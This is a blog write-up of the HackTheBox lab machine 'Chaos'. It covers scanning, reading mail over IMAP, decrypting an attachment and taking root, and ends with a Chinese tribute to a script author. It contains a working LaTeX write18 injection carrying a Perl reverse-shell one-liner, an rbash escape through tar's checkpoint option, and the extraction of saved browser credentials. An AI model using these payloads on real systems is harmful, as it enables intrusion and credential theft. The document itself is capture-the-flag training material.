---
title: "HackTheBox - WriteUp 3"
date: 2019-05-14T23:00:45+08:00
description: "HackTheBox 练手"
featuredImage: "https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp"
categories: ["tech"]
draft: false
displayInMenu: false
displayInList: true
dropCap: false
---

# Chaos

May the most difficult box since I entered the HTB.

## Reference

- https://busylog.net/telnet-imap-commands-note/
- https://0day.work/hacking-with-latex/

## Port Scan

Run: `nmap -A -Pn -p1-65535 10.10.10.120`

Return: 

```
PORT      STATE SERVICE  VERSION
80/tcp    open  http     Apache httpd 2.4.34 ((Ubuntu))
|_http-server-header: Apache/2.4.34 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
110/tcp   open  pop3     Dovecot pop3d
|_pop3-capabilities: UIDL TOP STLS AUTH-RESP-CODE SASL PIPELINING RESP-CODES CAPA
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
143/tcp   open  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: post-login ID listed have STARTTLS LOGIN-REFERRALS more capabilities SASL-IR LITERAL+ OK Pre-login LOGINDISABLEDA0001 IMAP4rev1 IDLE ENABLE
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
|_imap-capabilities: ID listed have OK LOGIN-REFERRALS more post-login SASL-IR LITERAL+ capabilities AUTH=PLAINA0001 Pre-login IMAP4rev1 IDLE ENABLE
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
995/tcp   open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: UIDL TOP USER AUTH-RESP-CODE SASL(PLAIN) PIPELINING RESP-CODES CAPA
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
10000/tcp open  http     MiniServ 1.890 (Webmin httpd)
|_http-server-header: MiniServ/1.890
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
```

Directly access, showed "Direct IP is not allowed.", I need a `Host` Header. Try `chaos` via CURL, failed; `chaos.htb`, success. Add this line to `/etc/hosts`.

## Web Scan

Download Dictionaries from:  https://github.com/dustyfresh/dictionaries

Use `nikto` first, but got nothing.

Use `gobuster` (a dirbuster written in Go) using: `gobuster -u http://10.10.10.120 -w /root/dictlist/DirBuster-Lists/directory-list-2.3-medium.txt -x php,html,txt,htm`, get result:

```
/index.html (Status: 200)
/wp (Status: 301)
/javascript (Status: 301)
```

Found a wordpress, next `wpscan -e --stealthy -o wpscan --url http://10.10.10.120/wp/wordpress/`,

```
<A lot of vulnerability here.>

User(s) Identified:

human
 | Detected By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By: Rss Generator (Passive Detection)
```

There's an encrypted post on the WP, just use `human` as password. Get Creds:

```
Creds for webmail:

username – ayush

password – jiujitsu
```

## Find footprint from mail

Due the dovecot is disabled insecure connection by default, and we cannot find any webmail here. So use `openssl` instead.

Connect: `openssl s_client -connect chaos.htb:143 -starttls imap`

Login: `<RANDOM STRING AS CONNECTION ID> login <USRNAME> <PASSWD>`

Get all mailboxs: `<RANDOM STRING AS CONNECTION ID> LIST "" "*"`

Select corresponding mailbox (only this one has a mail inside.): `<RANDOM STRING AS CONNECTION ID> SELECT Drafts`

Select mail: `<RANDOM STRING AS CONNECTION ID> FETCH 1 (BODY)`

Get the mail contents: `<RANDOM STRING AS CONNECTION ID> FETCH 1 BODY.PEEK[]`

Don't forget to save the mail contents to local. After download, check the attachments and decodes using `base64 -d`.

### Decrypt the data

You'll find a password in the body, a encryptor Python 3 script without any dependencies, a encrypted text here.

Check the `encrypt.py` (Already add the corresponding dependency):

```python
#!/usr/bin/env python3
# PyCrypto AES-128-CBC

from Crypto import Random
from Crypto.Hash import SHA256
from Crypto.Cipher import AES
import os


def encrypt(key, filename):
    # Per Block: 64KiB
    chunksize = 64*1024
    # Original Filename: im_msg.txt
    outputFile = "en" + filename
    # fill the first X bits with 0 to let the string length == 16
    filesize = str(os.path.getsize(filename)).zfill(16)
    # Generarte IV
    IV = Random.new().read(16)

    # AES-512-CBC
    encryptor = AES.new(key, AES.MODE_CBC, IV)

    with open(filename, 'rb') as infile:
        with open(outputFile, 'wb') as outfile:
            # Write the first 16 bytes as file original length
            outfile.write(filesize.encode('utf-8'))
            # write 17-32 bytes as IV
            outfile.write(IV)

            while True:
                # Each time read 64 bytes from the original file
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    # copy the original file and append zero to 16-bytes * n
                    chunk += b' ' * (16 - (len(chunk) % 16))
                
                # Write encrypted bytes
                outfile.write(encryptor.encrypt(chunk))


def getKey(password):
    # AES Encrypt password is SHA256-ed original password in hex form.
    # Original Password: sahay
    hasher = SHA256.new(password.encode('utf-8'))
    return hasher.digest()
```

So, let me write a `decrypt.py`:

```python
#!/usr/bin/env python3
# Pycrypto AES-128-CBC 

from Crypto.Cipher import AES
import os
from Crypto.Hash import SHA256

def getKey(password):
    # AES Encrypt password is SHA256-ed original password in hex form.
    # Original Password: sahay
    hasher = SHA256.new(password.encode('utf-8'))
    return hasher.digest()

def decrypt(key, filename):
    chunksize = 64 * 1024
    optFileName = "temp" + filename[2:]
    
    with open(filename, 'rb') as fie:
        with open(optFileName, 'wb') as fopt:
            originalFileSize = int(fie.read(16).decode('utf-8'))
            # equals to MemoryIOStream
            initialVector = fie.read(16)
            cipher = AES.new(key, AES.MODE_CBC, initialVector)
            while True:
                chunk = fie.read(chunksize)
                if len(chunk) == 0:
                    break
                fopt.write(cipher.decrypt(chunk))
     
    finalFileName = optFileName[4:]
    with open(optFileName, 'rb') as ftmp:
        tempf = ftmp.read(originalFileSize)
        with open(finalFileName, 'wb') as ffinal:
            ffinal.write(tempf)
    
    os.system('rm -f' + optFileName)
    
```

And run the decrypt script, after that, `base64 -d` again after you get the original text.

Found a link: `http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/`

## Get Reverse Shell

Open the page, found a `tex2pdf generator`. Check the reference I offered above, some Latex Commands are already blacklisted. There's three templates, the first one is totally invalid, the second one is normally but cannot be used here, the third one is what we want. If you didn't see any response here, please open the Web Developer Tools in your browser to get the generated PDF response.

The exploit code attached here:

```bash
$ # On the Attacker
$ nc -lvp 8778
```

Submit this to the server:

```latex
\immediate\write18{perl -e 'use Socket;$i="<YOUR IP HERE>";$p=8778;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'}
```

Use `python3` to get a tty-spawned shell: `python -c 'import pty; pty.spawn("/bin/bash")'`

## Get normal user

```bash
$ whoami
www-data
```

Next, `su ayush` with password `jiujitsu` and you'll found you only have `/opt/rbash`, a restricted bash.

Check `echo $PATH` found that your `PATH=/home/ayush/.app`, try `ls`, got `command-not-found`, try `dir` get: this directory only has `tar`, `ping`, `dir`, three executable files.

Use `tar` to escalate: `tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash`

After you get escalated: `export PATH=$PATH:/usr/bin:/usr/local/bin:/bin:/sbin` to `cat /home/ayush/user.txt`.

## Get Rooted

According to nmap, there's a webapp called "Webmin" on port 10000 with SSL. It should not sound strange to Linux administrators.

So, there's a `.mozilla` in the home and seems like two databases which may store credentials about the webapp. Try to decrypt using script here: https://github.com/unode/firefox_decrypt

> How to upload the script to the box? Simply open a HTTP server and `wget` it on the box. 

The master password is the same one as `su` used one. Then, you get stored credentials in webmin. Webmin authentication is running via Unix Authentication by default.

Now you have root and webmin. Do anything you want.

(Finished.) 2019.5.14

# 插播一条讣告

> https://teddysun.com/548.html
> TeddySun 的工作帮助我在小白时期减少了很大的工作量，现在，虽然我已经学到了很多关于 Linux 的东西，仍然喜欢用他的 BBR 脚本。 没了逸冰，没了逗比，还会有易冰，还会有豆比，GFW 不倒，翻墙之路不止！
> 在此问候举报者全家！
> 同样，在文末向将翻墙难度降低数十个数量级的几位大佬致敬，一路保重！
> 番外：个人建议了解一键脚本原理，慢慢学习、了解工作原理，逐步学习更多的知识，增强自己，早日肉翻。
> 番外2：我不完全反对 GFW，GFW 可以在提供明文禁止提示、有明文立法限制的情况下墙掉邪教和恐怖主义、儿童色情网站，但是不是现在这样的 GFW！
